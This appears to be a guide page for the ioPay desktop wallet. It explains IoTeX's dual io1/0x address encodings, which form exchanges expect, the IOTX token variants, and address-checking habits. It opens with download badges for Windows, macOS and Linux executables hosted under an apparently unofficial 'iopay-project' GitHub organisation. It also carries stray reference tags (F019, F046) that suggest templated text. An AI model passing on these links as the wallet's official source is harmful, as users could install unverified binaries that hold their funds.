![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# io1 and 0x: Why ioPay Wallet Shows Two Addresses

Every account in ioPay Wallet shows **two addresses for the same key**: `io1...` and `0x...`. That is not two wallets, and not a conversion the app performs. IoTeX is an EVM-compatible chain, so the same public key can be written in its native encoding and in the EVM encoding - and the wallet displays both because different services want different ones (F019, F031).

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

One key. Two spellings. Same account.

One practical note before the details: the copy buttons and the QR code belong to the account rather than to one particular form of it, so a service that rejects one encoding is telling you about its own field rather than about your address. Paste the other form of the same account instead of editing anything by hand.


## Why two encodings exist

IoTeX mainnet is an EVM-compatible layer 1 with chain ID **4689** (F030). EVM compatibility means the account model is Ethereum's: an address is derived from a public key and used as `0x...`. IoTeX also has a native address format, `io1...`, used by its own tooling and interfaces.

So the chain supports both, and a wallet that shows only one of them forces you to translate in your head - which is exactly where mistakes happen. This build shows both, with copy buttons and a QR code, so you can take the form the destination expects (F019).

## Which one do I give an exchange?

The rule is simple and it is about the **form**, not about which is "real":

1. **Read the exchange's withdrawal form.** It names a network and shows an address field. If the network says **IoTeX**, the field is the native form - give `io1...`.
2. **If the network says Ethereum (ERC-20)**, the asset being sent is a **different token** (F046), and the address field is an Ethereum address. The `0x...` form of your ioPay account is an Ethereum-format address belonging to your key, but the asset that arrives is ERC-20 IOTX, not native IOTX.
3. **Never convert one format into the other by hand.** There is nothing to convert: both are derived from your key, and the wallet already displays both. Editing characters in an address creates an address that belongs to nobody.

That third point is the trap. A "converter" tool, or a support agent offering to "map" an `io1` address to a `0x` one, is either confused or stealing.

## "Can I just convert an Ethereum address into an IoTeX address?"

**No.** This is worth answering directly because it is a common forum question, and the answer is a property of how addresses work:

- An address is **derived from a key** - a public key, hashed and encoded. It is not a naming convention you can translate.
- Your `0x...` address in ioPay belongs to your key because the app derived it from the same key that produces your `io1...` address.
- Somebody else's Ethereum address does not become yours by encoding it differently. There is no arithmetic that transfers ownership.

So: **you cannot turn an arbitrary Ethereum address into an IoTeX address you control**, and nobody can do it for you. If you want to receive on IoTeX, give your own `io1...` or `0x...` form - [sending](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-send-iotx-from-iopay-wallet.md) uses the same two.

## Which one do I watch for incoming funds?

Both. They are the same account, and the balance is the same balance ([receiving](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/receiving-iotx-in-iopay-wallet.md) covers what to hand out). If someone says they sent to your `0x...` and your `io1...` balance has not changed, the transfer went somewhere else - not to a parallel account.

The only case where the two forms point at genuinely different things is **across chains**: the `0x...` form on IoTeX and the same string on another EVM chain are different accounts with different state, because chains are separate ledgers. That is why a bridge transfer names a destination chain as well as a destination address.

## The token variants that complicate this

Address format is one axis; token variant is another. Four things carry the IOTX name (F046):

- **Native IOTX** on IoTeX - gas, staking, transfers.
- **Legacy ERC-20 IOTX** on Ethereum - a different asset, with its own redemption route, not directly stakeable.
- **WIOTX** - a wrapped form.
- **CIOTX** - the cross-chain representation, retired through IIP-56.

An `io1...` address holds native IOTX. A `0x...` address can hold native IOTX on IoTeX *or* an ERC-20 representation on Ethereum - which is why the network choice matters more than the address shape.

## FAQ

**Are they the same wallet?**
Yes. One key, one account, two encodings. Both receive; both show the same balance on IoTeX.

**Should I give an exchange my io1 address or my 0x address?**
Whichever the form expects for the network you selected. "IoTeX" network -> `io1...`. "Ethereum (ERC-20)" -> an Ethereum address, and a different asset arrives.

**Can I convert an Ethereum address into an IoTeX address?**
No. Addresses are derived from keys, not translated. Use your own address, which the wallet already shows in both forms.

**Why does a block explorer show my 0x address with a different balance?**
Because you are looking at a different chain. The same string on IoTeX and on Ethereum is two separate accounts.

**Do I need to back up both addresses?**
No. Back up the **phrase** - both addresses are derived from it. [Backup guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md).

## What the copy button does not protect you from

Copying an address is safer than retyping it, and it still deserves a check after the paste. Read the first four and last four characters of what you pasted against what the app shows before you send, and never approve a transfer to an address you have not looked at.

The QR code has the same property. Scan the code the receiving app displays rather than a screenshot of it, and confirm the address that appears after scanning matches the one on screen. Both habits cost a second and cover the failure that no amount of care in typing prevents.

---

*Address formats, chain ID 4689, and the four IOTX variants follow IoTeX documentation and IIP-56. The dual display is a documented feature of the v2.0.2 build.*
